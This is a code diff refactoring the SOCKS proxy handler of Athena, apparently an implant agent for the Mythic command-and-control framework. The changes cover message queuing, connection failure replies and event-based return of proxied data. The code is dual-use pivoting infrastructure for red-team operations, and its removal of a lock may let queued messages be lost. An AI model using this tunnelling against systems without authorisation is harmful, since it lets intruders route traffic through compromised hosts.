@@ -1,4 +1,5 @@
-﻿using Athena.Models.Athena.Socks;
+﻿using Athena.Models.Athena.Commands;
+using Athena.Models.Athena.Socks;
 using Athena.Models.Mythic.Response;
 using Athena.Utilities;
 using System;
@@ -14,15 +15,13 @@ namespace Athena.Commands.Model
     {
         private CancellationTokenSource ct { get; set; }
         private ConcurrentDictionary<int, AthenaSocksConnection> connections { get; set; }
-        //private ConcurrentBag<SocksMessage> messagesOut = new ConcurrentBag<SocksMessage>();
-        private List<SocksMessage> messagesOut = new List<SocksMessage>();
+        private ConcurrentBag<SocksMessage> messagesOut = new ConcurrentBag<SocksMessage>();
         private object _lock = new object();
         public bool running { get; set; }
 
         public SocksHandler()
         {
             this.running = false;
-            //this.connections = new Dictionary<int, SocksConnection>();
             this.connections = new ConcurrentDictionary<int, AthenaSocksConnection>();
 
         }
@@ -35,7 +34,7 @@ namespace Athena.Commands.Model
             this.ct = new CancellationTokenSource();
             //this.connections = new Dictionary<int, SocksConnection>();
             this.connections = new ConcurrentDictionary<int, AthenaSocksConnection>();
-            this.messagesOut = new List<SocksMessage>();
+            this.messagesOut = new ConcurrentBag<SocksMessage>();
 
             return true;
         }
@@ -106,12 +105,9 @@ namespace Athena.Commands.Model
                 return new List<SocksMessage>();
             }
             List<SocksMessage> msgOut;
-            lock (_lock)
-            {
-                msgOut = new List<SocksMessage>(this.messagesOut);
-                this.messagesOut.Clear();
-            }
-
+            msgOut = new List<SocksMessage>(this.messagesOut);
+            this.messagesOut.Clear();
+            msgOut.Reverse();
             return msgOut;
         }
 
@@ -128,7 +124,8 @@ namespace Athena.Commands.Model
 
                 if (conn.IsConnected)
                 {
-                    conn.SendAsync(await Misc.Base64DecodeToByteArrayAsync(sm.data));
+                    //conn.AddMessageToQueue(sm);
+                    conn.SendAsync(Misc.Base64DecodeToByteArray(sm.data));
                 }
                 else
                 {
@@ -156,24 +153,40 @@ namespace Athena.Commands.Model
                 }
 
                 ConnectionOptions co = new ConnectionOptions(sm); //Create new ConnectionOptions
+
+                if(co.ip is null || co.port == 0)
+                {
+                    lock (_lock)
+                    {
+                        this.messagesOut.Add(new SocksMessage
+                        {
+                            server_id = co.server_id,
+                            data = Misc.Base64Encode(new ConnectResponse
+                            {
+                                bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
+                                bndport = new byte[] { 0x00, 0x00 },
+                                addrtype = co.addressType,
+                                status = ConnectResponseStatus.GeneralFailure
+
+                            }.ToByte()).Result,
+                        });
+                    }
+                    return;
+                }
+
                 AthenaSocksConnection sc = new AthenaSocksConnection(co); //Create Socks Connection Object
-                sc.ActionQueueMessage = ReturnMessage;
+                sc.HandleSocksEvent += ReturnSocksMessage;
 
-                await AddConnection(sc); //Add our connection to the Dictionary
-
-
+                await AddConnection(sc); //Add our connection to the Dictionary;
                 Task.Run(async () =>
                 {
                     try
                     {
-                        sc.ConnectAsync();
-                        while (sc.IsConnecting) { };
+                        sc.Connect();
 
                         if (!sc.IsConnected)
                         {
-                            lock (_lock)
-                            {
-                                this.messagesOut.Insert(0,new SocksMessage
+                                this.messagesOut.Add(new SocksMessage
                                 {
                                     server_id = sc.server_id,
                                     data = Misc.Base64Encode(new ConnectResponse
@@ -184,15 +197,14 @@ namespace Athena.Commands.Model
                                         status = ConnectResponseStatus.GeneralFailure,
 
                                     }.ToByte()).Result,
+                                    exit = true
                                 });
-                            }
                         }
                     }
-                    catch
+                    catch (Exception e)
                     {
-                        lock (_lock)
-                        {
-                            this.messagesOut.Insert(0,new SocksMessage
+                        Console.WriteLine(e.ToString());
+                        this.messagesOut.Add(new SocksMessage
                             {
                                 server_id = sc.server_id,
                                 data = Misc.Base64Encode(new ConnectResponse
@@ -203,8 +215,8 @@ namespace Athena.Commands.Model
                                     status = ConnectResponseStatus.GeneralFailure
 
                                 }.ToByte()).Result,
+                                exit = true,
                             });
-                        }
                     }
                 });
             }
@@ -230,11 +242,12 @@ namespace Athena.Commands.Model
         /// <param name="sm">Socks Message</param>
         public void ReturnMessage(SocksMessage sm)
         {
-            //If a message gets deleted before this gets called, then I throw an error
-            lock (_lock)
-            {
-                this.messagesOut.Insert(0, sm);
-            }
+            this.messagesOut.Add(sm);
+        }
+
+        private async void ReturnSocksMessage(object sender, SocksEventArgs e)
+        {
+            this.messagesOut.Add(e.sm);
         }
     }
 }
